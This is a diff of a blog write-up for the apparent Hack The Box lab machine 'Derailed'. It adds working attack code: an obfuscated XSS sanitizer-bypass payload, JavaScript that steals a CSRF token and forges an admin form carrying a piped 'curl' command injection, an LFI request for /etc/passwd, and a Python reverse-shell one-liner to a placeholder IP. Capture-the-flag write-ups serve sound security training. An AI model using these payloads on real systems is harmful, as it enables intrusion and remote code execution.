@@ -73,7 +73,7 @@ if (!doNotTrack) {
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          8 min read
+          11 min read
         </div>
       </div>
     </header>
@@ -179,59 +179,125 @@ Check: SanitizeConfigCve
 Message: rails-html-sanitizer 1.4.2 is vulnerable to cross-site scripting when `select` and `style` tags are allowed (CVE-2022-32209). Upgrade to 1.4.3 or newer
 File: Gemfile.lock
 Line: 138
-</code></pre><h2 id="intended-approach-work-in-progress">Intended approach (work in progress)</h2>
+</code></pre><h2 id="intended-approach-xss-and-csrf">Intended approach: xss and csrf</h2>
 <ul>
-<li>Something to do with the following</li>
-<li>Register a user with the following name (you need to intercept the request to do it, client app has character limit)</li>
+<li>Reading from: <a href="https://hackerone.com/reports/1530898">https://hackerone.com/reports/1530898</a></li>
+<li>The web app is vulnerable to xss sanitization issue. We can utilise this to make the admin to execute our code. However, bear in mind that the session cookie is marked as <code>httpOnly</code>. Therefore, stealing cookie is not the way to go. Later, we will see that using <code>xss</code> we can understand how the <code>/administration</code> page is structured. The actual attack is achieved using <code>csrf</code>.</li>
+<li>Overview of the attack concept
+<ul>
+<li>This challenge is very similar to <code>rootme\web-client\CSRF-token-bypass</code>, so if you would like to have more challenge after this, you will learn a lot by visiting the same challenge on rootme.</li>
+<li>We need to first find a specific sequence to bypass the sanitization and then execute arbitrary code, e.g <code>xss</code></li>
+<li>Then, we need to use the xss to map out what&rsquo;s the administration page like</li>
+<li>After that, we need to craft a <code>csrf</code> payload to do two things
+<ol>
+<li>fetch an <code>authenticity_token</code> from the <code>/administration</code> page,</li>
+<li>craft a form that posts to <code>/administration/reports</code> with the <code>authenticity_token</code> we obtained earlier.</li>
+</ol>
+</li>
 </ul>
-<pre tabindex="0"><code>&lt;select&lt;style/&gt;W&lt;xmp&lt;script&gt;alert(1)&lt;/script&gt;
+</li>
+<li>To trigger the payload, following is the rough structure
+<ul>
+<li>Register a user by intercepting the traffic to bypass character limit</li>
+<li>Craft the user name with a specific pattern to bypass sanitization</li>
+<li>Login as the new user</li>
+<li>Create a clipnote with some random content</li>
+<li>Once the note is created, you should be able to see your xss being executed by viewing the note. This is where you can test your poc</li>
+<li>Report this note and wait for the admin to visit the note (sometimes the admin-visit process may be broken, if you are certain that your payload should work but didn&rsquo;t see anything within 2 minutes, tough luck, reset and restart. This part is not stable, you will be able to understand why it&rsquo;s the case once you have root and try to run the xss.py script manually)</li>
+</ul>
+</li>
+<li>The payload pattern to bypass sanitization is as follow</li>
+</ul>
+<pre tabindex="0"><code># &lt;any 40 characters&gt;&lt;bypass-pattern&gt;&lt;xss-payload&gt;
+# example:
+meowmeowmeowmeowmeowmeowmeowmeowmeowmeow&lt;select&lt;style/&gt;&lt;img src=&#34;http://&lt;ip&gt;&#34;&gt;
 </code></pre><ul>
-<li>Then post a random post and view it.</li>
-<li>The <code>created</code> part will be mangled.</li>
+<li>In this writeup, i&rsquo;ll bypass the steps of enum to map out how the <code>/administration</code> page is structure. You can do so using various means such as posting the page source to your http server that can accept post requests.</li>
+<li>The form post on the <code>/administration</code> page is structure like so.</li>
 </ul>
-<h1 id="enum-with-lfi">Enum with LFI</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/administration/reports&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;authenticity_token&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;authenticity_token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;authenticity_token&gt;&#34;</span> <span style="color:#a6e22e">autocomplete</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;off&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;report_log&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;report_23_11_2022.log&#34;</span> <span style="color:#a6e22e">hidden</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pt-4&#34;</span>&gt; 23.11.2022&lt;/<span style="color:#f92672">label</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;Download&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><ul>
+<li>So, for our purpose, we need to use xss to fetch the <code>authenticity_token</code> and then use <code>csrf</code> to exploit the <code>report_log</code> field.</li>
+<li>To fetch the <code>authenticity_token</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlHttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://derailed.htb:3000/administration&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">send</span>( <span style="color:#66d9ef">null</span> );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// an arbitrary delay to ensure the page is rendered
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMParser</span>().<span style="color:#a6e22e">parseFromString</span>(<span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">responseText</span>, <span style="color:#e6db74">&#39;text/html&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;authenticity_token&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">2000</span>);
+</span></span></code></pre></div><ul>
+<li>To make a post, we need to craft a malicious form first and then assign the fetched <code>authenticity_token</code> and the cmd injection payload</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// just copy the form code from above and clean it up a bit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newForm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMParser</span>().<span style="color:#a6e22e">parseFromString</span>(<span style="color:#e6db74">&#39;&lt;form id=&#34;badform&#34; method=&#34;post&#34; action=&#34;/administration/reports&#34;&gt;    &lt;input type=&#34;hidden&#34; name=&#34;authenticity_token&#34; id=&#34;authenticity_token&#34; value=&#34;placeholder&#34; autocomplete=&#34;off&#34;&gt;    &lt;input id=&#34;report_log&#34; type=&#34;text&#34; class=&#34;form-control&#34; name=&#34;report_log&#34; value=&#34;placeholder&#34; hidden=&#34;&#34;&gt;    &lt;button name=&#34;button&#34; type=&#34;submit&#34;&gt;Submit&lt;/button&gt;&#39;</span>, <span style="color:#e6db74">&#39;text/html&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">newForm</span>.<span style="color:#a6e22e">forms</span>.<span style="color:#a6e22e">badform</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">report_log</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|curl http://&lt;ip&gt;/?cmdi&#39;</span>;
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">authenticity_token</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">token</span>;
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span></code></pre></div><ul>
+<li>Then final payload looks like this</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlHttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://derailed.htb:3000/administration&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">send</span>( <span style="color:#66d9ef">null</span> );
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// send a signal to indicate which step has been achieved
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;IMG&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;/?step1&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// send a signal to indicate which step has been achieved
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;IMG&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;?step2&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fetch the token
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMParser</span>().<span style="color:#a6e22e">parseFromString</span>(<span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">responseText</span>, <span style="color:#e6db74">&#39;text/html&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;authenticity_token&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// craft the form
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newForm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMParser</span>().<span style="color:#a6e22e">parseFromString</span>(<span style="color:#e6db74">&#39;&lt;form id=&#34;badform&#34; method=&#34;post&#34; action=&#34;/administration/reports&#34;&gt;    &lt;input type=&#34;hidden&#34; name=&#34;authenticity_token&#34; id=&#34;authenticity_token&#34; value=&#34;placeholder&#34; autocomplete=&#34;off&#34;&gt;    &lt;input id=&#34;report_log&#34; type=&#34;text&#34; class=&#34;form-control&#34; name=&#34;report_log&#34; value=&#34;placeholder&#34; hidden=&#34;&#34;&gt;    &lt;button name=&#34;button&#34; type=&#34;submit&#34;&gt;Submit&lt;/button&gt;&#39;</span>, <span style="color:#e6db74">&#39;text/html&#39;</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">newForm</span>.<span style="color:#a6e22e">forms</span>.<span style="color:#a6e22e">badform</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// assign the values
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">report_log</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|curl http://&lt;ip&gt;/?cmdi&#39;</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">authenticity_token</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">token</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;badform&#39;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">2000</span>);
+</span></span></code></pre></div><ul>
+<li>Yet, it&rsquo;s not so convenient to register a user with the above as username. So, we need to obfuscate the payload using char code. You may do so using this tool: <a href="http://www.mauvecloud.net/charsets/CharCodeFinder.html">http://www.mauvecloud.net/charsets/CharCodeFinder.html</a></li>
+</ul>
+<pre tabindex="0"><code>meowmeowmeowmeowmeowmeowmeowmeowmeowmeow&lt;select&lt;style/&gt;&lt;img src=&#34;http://&lt;ip&gt;&#34; onerror=&#34;eval(String.fromCharCode(&lt;obfuscated-char-code&gt;))&#34;&gt;
+</code></pre><ul>
+<li>Now, register this username, create a note and report it. Watch for the callbacks from the target.</li>
+</ul>
+<h1 id="foothold">Foothold</h1>
 <ul>
-<li>Once you are an admin user, browse to the <code>/administration</code> route and see multiple reports. Report downloading is vulnerable to LFI and cmd injection, where you can use to download arbitrary files from the target and run arbitrary code.</li>
-<li>Intercept the traffic with burp and try to download a report (if the box is fresh and no reports are there, just create one).</li>
+<li>Once you&rsquo;ve achieved the above, we can now exploit the <code>/administration</code> report downloading part for a shell. Report downloading is vulnerable to LFI and cmd injection, where you can use to download arbitrary files from the target and run arbitrary code.</li>
+<li>You can play with the <code>report_log</code> parameter and try to download an arbitrary file</li>
 </ul>
 <pre tabindex="0"><code>authenticity_token=&lt;token&gt;&amp;report_log=/etc/passwd&amp;button=
 </code></pre><ul>
-<li>The same field is also vulnerable to cmd injection, so you can do this to run arbitrary cmd on the target. Note the pipe <code>|</code> character before the cmd you inject.</li>
+<li>The same field is also vulnerable to cmd injection, so you can exploit this to run arbitrary cmd on the target. Note the pipe <code>|</code> character before the cmd you inject.</li>
 </ul>
 <pre tabindex="0"><code>authenticity_token=&lt;token&gt;&amp;report_log=|&lt;cmd&gt;&amp;button=
 </code></pre><ul>
 <li>Read this post for more detail why this is exploitable: <a href="https://bishopfox.com/blog/ruby-vulnerabilities-exploits">https://bishopfox.com/blog/ruby-vulnerabilities-exploits</a></li>
+<li>Craft a payload like below and send it onto the <code>/administration/reports</code> endpoint to get a reverse shell</li>
 </ul>
-<h1 id="foothold">Foothold</h1>
-<ul>
-<li>After some enum using cmd injection, we found a file at <code>/var/www/rails-app/app/controllers/admin_controller.rb</code></li>
+<pre tabindex="0"><code>|python3+-c+&#39;import+pty;import+socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;ip&gt;&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;bash&#34;)&#39;
+</code></pre><ul>
+<li>After you have a shell and performed some enum, we can found a file at <code>/var/www/rails-app/app/controllers/admin_controller.rb</code></li>
 <li>Viewing the content, there is an <code>open</code> method used that can be exploited for RCE. This confirms why we are able to run code via <code>report_log</code> param:</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>report_log <span style="color:#f92672">=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:report_log</span><span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">begin</span>
 </span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> open(report_log)
-</span></span></code></pre></div><ul>
-<li>Craft a payload like below and send it onto the <code>/administration/reports</code> endpoint to get a reverse shell</li>
-</ul>
-<pre tabindex="0"><code>POST /administration/reports HTTP/1.1
-Host: derailed.htb:3000
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://derailed.htb:3000/administration
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 146
-Origin: http://derailed.htb:3000
-Connection: close
-Cookie: _simple_rails_session=&lt;cookie&gt;
-Upgrade-Insecure-Requests: 1
-
-authenticity_token=uumZ0OmMzMVSPrTh77aMmV9u21MvuqBcL8pxtfxv7Or4f69X9VF3OASjdwRUzmKXmcjMHta7JkVmkK_12wlBqg&amp;report_log=&lt;rce-payload&gt;&amp;button=
-
-# the payload i used is
-|python3+-c+&#39;import+pty;import+socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;ip&gt;&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;bash&#34;)&#39;
-</code></pre><h1 id="cracking-password-hashes">Cracking password hashes</h1>
+</span></span></code></pre></div><h1 id="cracking-password-hashes">Cracking password hashes</h1>
 <ul>
 <li>From <code>/var/www/rails-app/db/development.sqlite3</code>, we can find two hashes, one of them is crackable using <code>hashcat</code></li>
 </ul>
